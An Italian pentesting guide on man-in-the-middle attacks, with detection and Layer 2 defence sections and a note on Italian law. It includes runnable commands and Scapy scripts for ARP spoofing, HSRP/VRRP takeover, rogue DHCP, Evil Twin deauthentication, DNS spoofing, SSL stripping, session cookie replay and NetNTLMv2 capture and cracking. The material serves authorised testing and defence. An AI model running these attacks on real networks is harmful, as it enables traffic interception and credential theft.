---
title: 'Man In The Middle: Cos’è un Attacco MITM e Come Funziona'
slug: man-in-the-middle
description: 'Guida completa al Man in the Middle: ARP spoofing, SSL stripping, session hijacking, rogue DHCP, Evil Twin e tecniche MITM reali su reti enterprise e Wi-Fi.'
image: /man-in-the-middle.webp
draft: false
date: 2026-03-30T00:00:00.000Z
categories:
  - guides-resources
subcategories:
  - concetti
tags:
  - Man in the Middle
  - MITM
  - ARP Spoofing
  - Evil Twin
  - SSL Stripping
featured: false
---

# Attacco Man in the Middle (MITM): Tecniche di Intercettazione e Difese

Un attacco Man in the Middle (MITM) è una tecnica in cui un aggressore si inserisce nel canale di comunicazione tra due parti — tipicamente un client e un server — intercettando e potenzialmente alterando il traffico senza che nessuna delle due se ne accorga. Non serve rompere nulla: con [HTTPS](/articoli/http-https/) correttamente validato il contenuto resta illeggibile, ma posizionarsi nel mezzo basta già per vedere metadati, timing, e tutto ciò che viaggia ancora in chiaro.

Capire come funziona un attacco MITM significa capire come un attaccante arriva a occupare quella posizione — [ARP spoofing](/articoli/arp/) su LAN, rogue [DHCP](/articoli/dhcp/), takeover di [VRRP/HSRP](/articoli/vrrp-hsrp-carp/), Evil Twin su [Wi-Fi](/articoli/wifi-802-11/) — e cosa può fare una volta lì, e cosa no.

***

## Cos'è un attacco Man in the Middle

Il nome descrive la posizione: l'attaccante è letteralmente *nel mezzo*, tra A e B. A pensa di parlare con B, B pensa di parlare con A, ma entrambi passano attraverso l'attaccante.

```
Client ←→ [ATTACCANTE] ←→ Server
```

L'attaccante mantiene due sessioni attive simultaneamente: una con il client e una con il server. Riceve i dati da entrambi, può modificarli, e li ri-inoltra all'altra parte. Il traffico continua a fluire — la connessione funziona — ma passa interamente attraverso l'attaccante.

### Cosa protegge davvero e cosa no

Il MITM non significa automaticamente "l'attaccante legge tutto il traffico". Questa è l'imprecisione più comune sull'argomento, e vale la pena chiarirla subito:

* Su **traffico in chiaro** (HTTP, FTP, Telnet, SMTP/POP3/IMAP non cifrati), posizionarsi nel mezzo equivale a leggere tutto.
* Su **HTTPS con certificato validato correttamente dal client**, la sola posizione di rete non basta: l'attaccante vede IP, porte, SNI, dimensioni e timing dei pacchetti, ma non il contenuto. Per leggere anche quello serve rompere la validazione TLS (certificato falso accettato dal client, downgrade a HTTP via SSL stripping, o compromissione della CA).
* "Sparisce senza lasciare traccia" è altrettanto impreciso: il posizionamento produce quasi sempre indicatori osservabili — variazione del MAC del gateway, TTL anomalo, certificati inattesi — anche quando l'applicazione non mostra errori.

Le conseguenze reali di un MITM riuscito, quando le condizioni sopra lo permettono:

* Credenziali catturate in chiaro (HTTP, FTP, SMTP, LDAP non cifrati)
* Session token rubati per [session hijacking](/articoli/session-hijacking/)
* Contenuto modificato in transito (inject di payload in pagine HTTP)
* Downgrade da HTTPS a HTTP tramite SSL stripping
* Redirect verso server malevoli tramite DNS spoofing
* Intercettazione di comunicazioni interne non cifrate

***

## Come funziona un attacco MITM: le fasi

### Fase 1: Posizionamento

L'attaccante deve prima entrare nel path del traffico. È il cuore tecnico del MITM: senza questa fase nient'altro è possibile. Le tecniche per arrivarci — ARP, HSRP/VRRP, DHCP, Evil Twin — sono quelle della sezione successiva.

### Fase 2: Intercettazione

Una volta nel path, il traffico transita attraverso l'attaccante. Con il forwarding IP abilitato, i pacchetti vengono re-instradati verso la destinazione legittima mantenendo la connessione attiva:

```bash
echo 1 > /proc/sys/net/ipv4/ip_forward
```

Senza questo step, l'attacco diventa un DoS: il traffico arriva all'attaccante e si ferma lì.

### Fase 3: Analisi e manipolazione

Con il traffico che fluisce attraverso l'interfaccia, l'attaccante può:

* **Sniffare passivamente**: registrare tutto senza modificare nulla
* **Iniettare attivamente**: inserire payload nel traffico in transito
* **Fare SSL stripping**: degradare HTTPS a HTTP quando il client non applica HSTS
* **Modificare risposte**: alterare contenuto HTML, JSON o binario in chiaro

### Fase 4: Relay

Il traffico viene re-inoltrato alla destinazione originale. La connessione rimane operativa e la vittima, nella maggior parte dei casi, non nota interruzioni.

***

## Tecniche MITM: come ci si posiziona nel mezzo

### ARP Spoofing (ARP Poisoning)

La tecnica MITM più usata su reti locali. Sfrutta una caratteristica strutturale di [ARP](/articoli/arp/): non ha autenticazione. Qualsiasi host può inviare una ARP Reply affermando di essere chiunque — per i dettagli su struttura del pacchetto, ARP cache e Gratuitous ARP vedi la guida dedicata.

L'attaccante invia Gratuitous ARP Reply false a entrambe le vittime:

* Alla vittima A dice: *"L'IP del gateway è il mio MAC"*
* Al gateway dice: *"L'IP della vittima A è il mio MAC"*

Entrambi aggiornano la propria ARP cache con il MAC dell'attaccante. Da quel momento, il traffico tra A e il gateway passa per l'attaccante.

```bash
# Con arpspoof (dsniff suite)
arpspoof -i eth0 -t 192.168.1.10 192.168.1.1   # Avvelena la vittima
arpspoof -i eth0 -t 192.168.1.1 192.168.1.10   # Avvelena il gateway

# Con bettercap (tutto integrato)
bettercap -iface eth0
# Dentro bettercap:
net.probe on
set arp.spoof.targets 192.168.1.10
arp.spoof on
net.sniff on
```

Può essere costruito anche manualmente con [Scapy](/articoli/scapy/), campo per campo, oltre che con tool dedicati come [bettercap](/articoli/bettercap/) o [ettercap](/articoli/ettercap/).

### Rogue Gateway via VRRP/HSRP

Una tecnica meno nota ma molto efficace in ambienti enterprise: sfruttare i protocolli di ridondanza del gateway come [HSRP, VRRP e CARP](/articoli/vrrp-hsrp-carp/). Questi protocolli inviano annunci in chiaro e, nella maggior parte delle configurazioni reali, senza autenticazione.

Con HSRP, il router che annuncia la priority più alta vince l'elezione e diventa Active — **ma solo se il preemption è abilitato**: senza preemption, un router già Active resta tale anche se arriva un annuncio con priority superiore, e l'attaccante deve aspettare un failover naturale (o forzarlo con un pacchetto Coup) per prendere il ruolo. Verificalo nel lab prima di dare per scontato che basti un singolo pacchetto.

```bash
# Con Yersinia
yersinia hsrp -attack 1 -interface eth0   # Diventa router HSRP Active

# Con Scapy per VRRP — nota: HSRPv1 usa multicast 224.0.0.2,
# HSRPv2 usa 224.0.0.102; VRRP usa invece 224.0.0.18 con IP proto 112
from scapy.all import *
vrrp = (Ether(dst="01:00:5e:00:00:12") /
        IP(dst="224.0.0.18", ttl=255, proto=112) /
        VRRP(vrid=1, priority=255, addrlist=["192.168.1.1"]))
sendp(vrrp, iface="eth0", loop=1, inter=1)
```

### Rogue DHCP Server

Il server [DHCP](/articoli/dhcp/) distribuisce IP, gateway e DNS ai client. Se l'attaccante risponde prima del server legittimo con un Offer che punta a se stesso, i nuovi client della rete lo usano come gateway.

```bash
# Setup rogue DHCP con dnsmasq
# /etc/dnsmasq.conf
interface=eth0
dhcp-range=192.168.1.100,192.168.1.200,12h
dhcp-option=3,192.168.1.50      # Gateway = attaccante
dhcp-option=6,192.168.1.50      # DNS = attaccante

dnsmasq --no-daemon
```

L'attacco colpisce i client *al momento della connessione*, non quelli già configurati — il che lo rende efficace soprattutto contro laptop che si riconnettono o dispositivi nuovi.

### Evil Twin (Rogue Access Point Wi-Fi)

Su reti wireless, l'Evil Twin è l'equivalente del rogue DHCP: l'attaccante crea un access point con lo stesso SSID della rete legittima. Combinato con la deauthentication, forza la riconnessione all'AP malevolo — i dettagli su frame 802.11, WPA2/WPA3 e PMKID sono nella guida dedicata al [Wi-Fi](/articoli/wifi-802-11/).

```bash
# Deauthentication per forzare la riconnessione
aireplay-ng -0 0 -a <BSSID_legittimo> wlan0mon

# AP Evil Twin con hostapd
cat > /tmp/hostapd.conf << EOF
interface=wlan1
driver=nl80211
ssid=NomeReteLegittima
channel=6
hw_mode=g
EOF
hostapd /tmp/hostapd.conf
```

Una volta connessi all'Evil Twin, i client ricevono DHCP dal server dell'attaccante e il loro traffico è visibile.

### DNS Spoofing

Il DNS spoofing risponde a query [DNS](/articoli/dns/) con record falsi, prima che arrivi la risposta del resolver legittimo — non "avvelena" la cache di un resolver a distanza, ma sfrutta la posizione MITM già ottenuta (es. via ARP spoofing) per intercettare le query in transito e rispondere per primo:

```bash
# Con bettercap — dns.spoof
set dns.spoof.domains hackita.it,*.corp.internal
set dns.spoof.address 192.168.1.50
dns.spoof on
```

Oppure rispondere alle query intercettate con Scapy, in posizione on-path:

```python
from scapy.all import *

def spoof_dns(pkt):
    if pkt.haslayer(DNS) and pkt[DNS].qr == 0:
        spoofed = (
            IP(src=pkt[IP].dst, dst=pkt[IP].src) /
            UDP(sport=53, dport=pkt[UDP].sport) /
            DNS(id=pkt[DNS].id, qr=1, aa=1, qd=pkt[DNS].qd,
                an=DNSRR(rrname=pkt[DNS].qd.qname,
                         ttl=300,
                         rdata="192.168.1.50"))
        )
        send(spoofed, verbose=0)

sniff(filter="udp port 53", prn=spoof_dns, iface="eth0")
```

### ICMP Redirect

I messaggi [ICMP](/articoli/icmp/) Redirect vengono usati dai router per suggerire percorsi alternativi. Inviando Redirect falsi, l'attaccante può modificare le routing table degli host vittima senza toccare ARP:

```python
from scapy.all import *

send(IP(src=gateway_ip, dst=victim_ip) /
     ICMP(type=5, code=1, gw=attacker_ip) /
     IP(src=victim_ip, dst=target_ip) /
     UDP())
```

Più silenziosa dell'ARP spoofing: genera meno traffico anomalo e raramente viene monitorata.

***

## SSL Stripping: il downgrade da HTTPS a HTTP

L'SSL stripping è la tecnica che rende il MITM pericoloso anche in presenza di HTTPS. L'idea: il client chiede una risorsa HTTP, l'attaccante fa la richiesta al server in HTTPS, riceve la risposta cifrata, la decifra e la ri-serve al client in chiaro su HTTP.

```
Client --[HTTP]--> Attaccante --[HTTPS]--> Server
Client <-[HTTP]-- Attaccante <-[HTTPS]-- Server
```

Il server pensa di parlare con un client HTTPS. Il client pensa di parlare con un server HTTP. L'attaccante vede tutto in chiaro.

```bash
# Con sslstrip (tool originale)
iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 8080
sslstrip -l 8080

# Con bettercap — il caplet hstshijack aggira parte delle protezioni HSTS
set https.proxy.sslstrip true
https.proxy on
hstshijack/hstshijack
```

SSL stripping è mitigato da **HSTS** ([http-https](/articoli/http-https/)): un header che forza il browser a usare sempre HTTPS per quel dominio. Ma ha un limite: funziona solo se il client ha già visitato il sito e ha memorizzato la policy, oppure se il dominio è nella preload list del browser. Al primo accesso a un dominio senza preload, la finestra per lo stripping resta aperta.

Una tecnica avanzata e molto più limitata nella pratica è l'**HSTS bypass via NTP downgrade** ("Delorean", presentata da José Selvi nel 2015): manomettendo l'orologio del client tramite un rogue server [NTP](/articoli/ntp/) (anche distribuito via DHCP option 42), si può far scadere artificialmente la policy HSTS memorizzata nel browser. Non è una tecnica generale applicabile a qualunque dominio: dipende dalla durata della policy memorizzata, da quanto il client si fida del nuovo orario, e non ha effetto su un dominio già nella preload list del browser. Va trattata come caso specifico da verificare in lab, non come bypass universale di HSTS.

***

## Session Hijacking

Il passo successivo al MITM su traffico HTTP: rubare il session token di un utente già autenticato per impersonarlo senza conoscere le credenziali. La meccanica completa — flag `HttpOnly`/`Secure`/`SameSite`, session fixation, invalidazione post-logout — è nella guida dedicata al [session hijacking](/articoli/session-hijacking/).

Dopo MITM e SSL stripping (o su traffico HTTP puro), intercettare i cookie di sessione è immediato con uno sniffer, o con [bettercap](/articoli/bettercap/):

```bash
net.sniff on
# Filtra per Set-Cookie e Cookie headers
```

Con il session token:

```bash
curl -b "session=abc123def456" https://target.com/dashboard
```

I session token hanno una scadenza, e l'attacco deve avvenire mentre è ancora valido. Su sessioni brevi (15-30 minuti) la finestra è stretta; su applicazioni legacy con sessioni di giorni, il rischio è molto più alto.

***

## Catturare credenziali in chiaro: checklist dei protocolli

In posizione MITM, questi protocolli trasmettono credenziali in chiaro o facilmente attaccabili — **sempre che il traffico non sia già incapsulato in TLS/HTTPS**, nel qual caso la posizione di rete da sola non basta:

| Protocollo      | Porta | Credenziali                | Tool                                                                 |
| --------------- | ----- | -------------------------- | -------------------------------------------------------------------- |
| HTTP            | 80    | Username/password nei form | [bettercap](/articoli/bettercap/), [Wireshark](/articoli/wireshark/) |
| FTP             | 21    | USER + PASS in chiaro      | tcpdump, Wireshark                                                   |
| Telnet          | 23    | Login completo in chiaro   | Wireshark                                                            |
| SMTP            | 25    | AUTH LOGIN in base64       | Wireshark                                                            |
| POP3            | 110   | USER + PASS in chiaro      | Wireshark                                                            |
| IMAP            | 143   | LOGIN command in chiaro    | Wireshark                                                            |
| LDAP            | 389   | Bind DN + password         | Wireshark                                                            |
| HTTP Basic Auth | 80    | Base64 decodificabile      | Wireshark                                                            |
| SNMP v1/v2c     | 161   | Community string in chiaro | Wireshark                                                            |

Due righe della tabella originale meritano una correzione a parte, perché sono gli errori più comuni che si leggono in giro:

* **HTTP Basic Auth su 443**: senza SSL stripping riuscito, il traffico su HTTPS resta cifrato — la posizione MITM da sola non rivela l'header `Authorization`. Il Basic Auth è "a rischio" sul 443 solo se lo stripping ha già funzionato.
* **SMB/NTLM e Kerberos**: [Responder](/articoli/responder/) non richiede una posizione MITM. Sfrutta richieste broadcast di risoluzione nomi (LLMNR, NBT-NS, mDNS) sullo stesso segmento, e quello che cattura è quasi sempre un challenge-response **NetNTLMv2**, non l'hash NTLM statico — va craccato offline con [Hashcat](/articoli/hashcat/) (modalità 5600) o relayato, non riusato direttamente come nel pass-the-hash. Per [Kerberos](/articoli/kerberos/), Responder non c'entra: l'attacco realistico in posizione di sniffing è catturare un AS-REQ con pre-auth cifrata e tentare il cracking offline del timestamp (o, più comunemente in un assessment AD, AS-REP Roasting e Kerberoasting, che non richiedono affatto una posizione MITM).

***

## MITM su HTTPS: cosa è davvero efficace

### SSL Stripping

Come descritto sopra: efficace contro siti senza HSTS o alla prima visita a un dominio non preloaded.

### Certificato falso (richiede CA installata sul client)

In ambienti aziendali con MDM o GPO che distribuiscono certificati CA interni, un attaccante che ha compromesso la CA interna può generare certificati validi per qualsiasi dominio. Il browser mostra il lucchetto anche su un MITM completo — è lo scenario in cui il MITM legge davvero tutto il traffico HTTPS.

### TLS session resumption: cosa significa davvero il rischio

Una formulazione diffusa — "un ticket di sessione catturato permette di decifrare sessioni future" — è fuorviante così com'è. Un singolo session ticket catturato non dà nulla da solo: il rischio reale riguarda il **server**, non il singolo ticket. Se il server cifra i ticket con una chiave (STEK, Session Ticket Encryption Key) che non ruota mai o viene compromessa, chi ottiene quella chiave può derivare le sessioni cifrate con ticket emessi in quella finestra temporale — un problema di gestione delle chiavi lato server, non qualcosa che un attaccante ottiene intercettando un singolo ticket in transito.

***

## MITM vs cifratura: cosa protegge e cosa no

Una confusione comune: "usiamo HTTPS, non siamo vulnerabili al MITM." HTTPS con validazione del certificato intatta protegge dal MITM passivo. Contro un MITM attivo con SSL stripping, la protezione dipende da HSTS — che non è universale.

Protezioni che tengono anche contro un MITM attivo:

* **Certificate pinning** (app mobile, API)
* **mTLS** (autenticazione reciproca con certificati)
* **HSTS + preload** (browser, solo per siti nella preload list)
* **VPN** ([vpn](/articoli/vpn/), [IPSec](/articoli/ipsec/), WireGuard): cifra il tratto coperto dal tunnel. Non è una protezione "completa contro qualsiasi MITM" per definizione — la sicurezza dipende da dove termina il tunnel: se l'endpoint remoto è oltre il tratto cifrato, quel segmento resta esposto come qualunque altro traffico non protetto.

Cosa non protegge a sufficienza:

* **HTTPS senza HSTS** → vulnerabile a SSL stripping alla prima visita
* **HTTP puro** → completamente visibile
* **Protocolli applicativi non cifrati** (FTP, Telnet, SMTP, LDAP senza TLS) → credenziali in chiaro

***

## Attacchi MITM reali: casi pratici da engagement

### Scenario 1: LAN corporate senza 802.1X

Target: rete ufficio con switch non gestiti o senza DHCP Snooping/DAI.

1. Connessione fisica a una porta libera
2. ARP spoofing verso la vittima e il gateway
3. SSL stripping sul traffico HTTPS senza HSTS
4. Cattura credenziali su portal intranet HTTP, LDAP in chiaro, SMTP non cifrato

Strumenti: [bettercap](/articoli/bettercap/), [Wireshark](/articoli/wireshark/), [Responder](/articoli/responder/) (per NetNTLMv2, senza bisogno della posizione MITM)

### Scenario 2: Evil Twin in area pubblica o Wi-Fi corporate

Target: utenti che si riconnettono automaticamente a SSID noti.

1. Deauthentication dall'AP legittimo
2. Evil Twin con stesso SSID, canale diverso, segnale più forte
3. DHCP con gateway e DNS dell'attaccante
4. SSL stripping e DNS spoofing per phishing delle credenziali

Strumenti: aircrack-ng suite, hostapd, dnsmasq, bettercap

### Scenario 3: HSRP Takeover in rete enterprise

Target: segmento con switch Cisco e HSRP senza autenticazione, con preemption abilitato.

1. Ascolto passivo del traffico HSRP (multicast 224.0.0.2 per v1, 224.0.0.102 per v2)
2. Invio Hello HSRP con Priority 255
3. Diventa router Active del segmento (solo con preemption attivo — senza, serve aspettare un failover naturale)
4. Tutto il traffico verso l'esterno passa per lui
5. Sniffing di massa su tutti gli host del VLAN

Strumenti: Yersinia, Scapy, Wireshark

Scenario critico perché bypassa completamente i controlli basati su ARP — nessun tool di detection ARP lo rileva. Il cambiamento è visibile solo nel traffico HSRP o nella variazione del MAC del gateway.

### Scenario 4: Rogue DHCP + DNS Spoofing per credential harvesting

Target: utenti che si connettono alla rete (laptop in uscita e rientro, ospiti, nuovi dispositivi).

1. DHCP starvation per esaurire il pool del server legittimo
2. Rogue DHCP server che risponde più velocemente
3. I client ottengono gateway e DNS dell'attaccante
4. DNS spoofing verso phishing page dell'applicazione aziendale
5. Raccolta credenziali

Strumenti: yersinia (DHCP starvation), dnsmasq, bettercap

***

## Tool MITM: panoramica pratica

### bettercap

Lo strumento più completo e moderno. Integra ARP spoofing, DNS spoofing, SSL stripping, sniffing, injection, Evil Twin, BLE e Wi-Fi attacks — vedi la [guida dedicata a bettercap](/articoli/bettercap/) per il dettaglio di ogni modulo.

```bash
apt install bettercap

bettercap -iface eth0 -eval "net.probe on; arp.spoof on; net.sniff on"

# Con moduli specifici
set arp.spoof.targets 192.168.1.10
set dns.spoof.domains *.target.com
set dns.spoof.address 192.168.1.50
arp.spoof on
dns.spoof on
net.sniff on
```

### Wireshark e tshark

Analisi passiva del traffico catturato — guide complete su [Wireshark](/articoli/wireshark/) e [tshark](/articoli/tshark/). Filtri utili per MITM:

```
# Credenziali HTTP
http.request.method == "POST" && http contains "password"

# Cookie di sessione
http.cookie

# Credenziali FTP
ftp.request.command == "PASS"

# Traffico DNS con TTL insolito (possibile spoofing)
dns.flags.response == 1 && dns.resp.ttl < 10

# ARP spoofing (stesso IP con MAC diversi)
arp.duplicate-address-detected
```

### Responder

Specializzato nel catturare NetNTLMv2 su reti Windows — guida completa su [Responder](/articoli/responder/). A differenza delle altre tecniche di questo articolo, **non richiede una posizione MITM**: sfrutta richieste broadcast LLMNR/NBT-NS/mDNS sullo stesso segmento.

```bash
responder -I eth0 -wrf
```

Gli hash NetNTLMv2 vanno craccati offline con hashcat (modalità 5600):

```bash
hashcat -m 5600 ntlmv2_hashes.txt /usr/share/wordlists/rockyou.txt
```

### mitmproxy

Proxy interattivo per HTTP/HTTPS con supporto a script Python per modifiche in tempo reale al traffico — guida dedicata su [mitmproxy](/articoli/mitmproxy/). Eccellente per web application pentesting: permette di intercettare, modificare e ri-inviare singole richieste, a livello di rete, trasparente all'applicazione.

```bash
mitmproxy -p 8080
```

### ettercap

Tool MITM storico, ancora utile per quick test — guida dedicata su [ettercap](/articoli/ettercap/):

```bash
ettercap -T -q -i eth0 -M arp:remote /192.168.1.10// /192.168.1.1//
```

***

## MITM in un engagement di pentesting

### Reconnaissance

Prima di qualsiasi attacco attivo, identificare il layout della rete:

```bash
# Scoprire host attivi e gateway
arp-scan --localnet

# Identificare il router HSRP/VRRP attivo
tcpdump -i eth0 -nn 'udp port 1985 or proto 112'

# Verificare se DHCP Snooping è attivo (prova a fare un rogue offer)
yersinia dhcp -attack 2 -interface eth0
```

### Posizionamento silenzioso

Tecniche ordinate per rumore generato, dalla più silenziosa:

* **ICMP Redirect**: modifica routing senza toccare ARP
* **HSRP/VRRP takeover**: zero traffico ARP anomalo, ma visibile nel traffico HSRP/VRRP stesso, e richiede condizioni specifiche (preemption per HSRP)
* **Rogue DHCP**: colpisce solo nuovi client
* **ARP spoofing**: più rumoroso ma più veloce e universale

### Analisi post-positioning

```bash
# Verificare di essere nel path
tcpdump -i eth0 -nn host 192.168.1.10

# Estrarre credenziali in chiaro
tshark -i eth0 -Y "http.request.method==POST or ftp.request.command==PASS" \
  -T fields -e http.request.uri -e http.file_data

# Monitorare sessioni attive
ss -tnp
```

### Cleanup

```bash
# Fermare arp.spoof su bettercap
arp.spoof off

# Ripristinare ARP cache corretta
arping -c 5 -I eth0 -S 192.168.1.1 192.168.1.10   # gateway → vittima
arping -c 5 -I eth0 -S 192.168.1.10 192.168.1.1    # vittima → gateway
```

***

## Detection del MITM: come si vede dall'interno

### Anomalie ARP

```bash
# Linux
arpwatch -i eth0
# Alert: "changed ethernet address" → ARP spoofing in corso

# Windows
arp -a
```

### Variazioni del gateway MAC

```bash
EXPECTED_MAC="aa:bb:cc:dd:ee:ff"
CURRENT_MAC=$(arp -n 192.168.1.1 | awk '/192.168.1.1/{print $3}')
[ "$CURRENT_MAC" != "$EXPECTED_MAC" ] && echo "ALERT: Gateway MAC changed!"
```

### TTL anomali

In posizione MITM, i pacchetti subiscono un hop aggiuntivo — il TTL si riduce di 1 in più del normale. Rilevabile monitorando il TTL dei pacchetti ricevuti.

### Certificati TLS inattesi

```bash
echo | openssl s_client -connect target.com:443 2>/dev/null | \
  openssl x509 -fingerprint -noout
```

Un fingerprint che cambia tra sessioni è un indicatore di possibile MITM attivo (certificato falso o CA compromessa).

### Traffico HSRP/VRRP anomalo

```bash
tcpdump -i eth0 -nn 'udp port 1985' | grep -E "priority (200|255)"
```

***

## Difesa contro gli attacchi Man in the Middle

### Livello 2: Dynamic ARP Inspection (DAI)

```
! Cisco — DAI richiede DHCP Snooping
ip dhcp snooping
ip dhcp snooping vlan 10
ip arp inspection vlan 10
ip arp inspection validate src-mac dst-mac ip
```

Scarta i pacchetti ARP che non corrispondono alla binding table IP/MAC/porta costruita da DHCP Snooping.

### Livello 2: DHCP Snooping

```
ip dhcp snooping
interface GigabitEthernet1/0/24   ! Uplink
 ip dhcp snooping trust
```

### Livello 2: HSRP/VRRP Authentication

```
! HSRP con MD5
standby 1 authentication md5 key-string <strong-password>
```

Previene il takeover da host non autorizzati — dettagli su configurazione e limiti nella guida [VRRP/HSRP/CARP](/articoli/vrrp-hsrp-carp/).

### Livello 2: 802.1X Network Access Control

Autenticare ogni dispositivo prima di permettergli l'accesso alla rete elimina la possibilità di ARP spoofing da host non autorizzati.

### Livello 3: HSTS e preload

```
Strict-Transport-Security: max-age=31536000; includeSubDomains; preload
```

Rende SSL stripping inefficace sui domini già visitati o nella preload list.

### Livello 4: Certificate Pinning e mTLS

Il pinning impedisce che un certificato diverso dall'originale venga accettato, anche se firmato da una CA fidata. In ambienti zero-trust, mTLS impedisce a un MITM di completare l'handshake senza il certificato client legittimo.

### Monitoraggio

```bash
apt install arpwatch
arpwatch -i eth0 -m admin@corp.internal
```

***

## Legalità del MITM in un pentest

Un MITM su reti o sistemi senza autorizzazione esplicita rientra tipicamente nell'intercettazione illecita di comunicazioni informatiche o telematiche (art. 617-quater del Codice Penale italiano), e l'installazione di apparecchiature pensate per intercettare è punita a sua volta dall'art. 617-quinquies. Se il traffico intercettato viene alterato, può rilevare anche l'art. 617-sexies (falsificazione del contenuto di comunicazioni informatiche), e l'accesso stesso ai sistemi coinvolti ricade spesso sotto l'art. 615-ter (accesso abusivo a un sistema informatico). L'inquadramento esatto dipende dai fatti specifici — questa è una descrizione generale, non un parere legale: opera sempre nell'ambito di un contratto di engagement firmato con scope definito.

***

## FAQ su Man in the Middle

**Cos'è un attacco man in the middle?**
Una tecnica in cui un attaccante si inserisce nel canale di comunicazione tra due host, intercettando e potenzialmente modificando il traffico in transito senza che le vittime se ne accorgano. L'attaccante mantiene due sessioni separate: una con il client e una con il server.

**Cosa significa il termine man in the middle?**
Descrive la posizione dell'attaccante: letteralmente "nel mezzo" tra due parti che comunicano, entrambe convinte di parlare direttamente l'una con l'altra.

**Qual è la differenza tra ARP spoofing e MITM?**
ARP spoofing è una delle tecniche usate per posizionarsi nel mezzo. Modifica la ARP cache delle vittime, reindirizzando il traffico verso l'attaccante. Il MITM è il risultato — la posizione nel mezzo — raggiungibile anche con rogue DHCP, HSRP/VRRP takeover, Evil Twin Wi-Fi, o ICMP redirect.

**HTTPS protegge dal man in the middle?**
Protegge dal MITM passivo quando la validazione del certificato è intatta: l'attaccante vede metadati ma non il contenuto. Senza HSTS, un attaccante attivo può comunque tentare SSL stripping per degradare la connessione a HTTP in chiaro. Il certificate pinning offre protezione più robusta per applicazioni critiche.

**Quali tool si usano per eseguire un MITM?**
bettercap (il più completo e moderno), ettercap (storico), arpspoof (dsniff suite), mitmproxy (per HTTP/HTTPS interattivo), e Responder per NetNTLMv2 (che non richiede posizione MITM). Wireshark e tshark per l'analisi del traffico intercettato.

**Come si rileva un attacco MITM in corso?**
Variazione del MAC associato al gateway (arpwatch), ARP Reply non sollecitate, TTL ridotto di 1 rispetto al normale, certificati TLS con fingerprint diverso dall'atteso, traffico HSRP/VRRP con Priority anomala da IP non autorizzati.

**È legale fare un MITM durante un pentest?**
Solo con autorizzazione scritta esplicita che copra specificamente le tecniche di intercettazione del traffico. Vedi la sezione legale sopra.

***

## Conclusione sul Man in the Middle

Il MITM non è un singolo attacco: è una posizione. Come ci si arriva dipende dalla rete — ARP su LAN, HSRP/VRRP su enterprise, Evil Twin su Wi-Fi, rogue DHCP su reti non protette. Una volta lì, cosa si può fare dipende da cosa c'è sopra quella posizione: sniffing passivo su traffico in chiaro, SSL stripping dove manca HSTS, session hijacking, credential harvesting — ma non la lettura automatica di tutto il traffico cifrato, che resta protetta quando la validazione TLS regge.

La difesa richiede protezioni a più livelli: DAI e DHCP Snooping a livello 2, autenticazione HSRP a livello di routing, HSTS e certificate pinning a livello applicativo. Nessuna singola misura è sufficiente da sola.

In un engagement di internal network pentesting, il MITM è quasi sempre fattibile in qualche forma. La domanda operativa non è "posso", ma quale tecnica genera meno rumore per quello specifico ambiente — e quanto, una volta lì, è davvero leggibile.
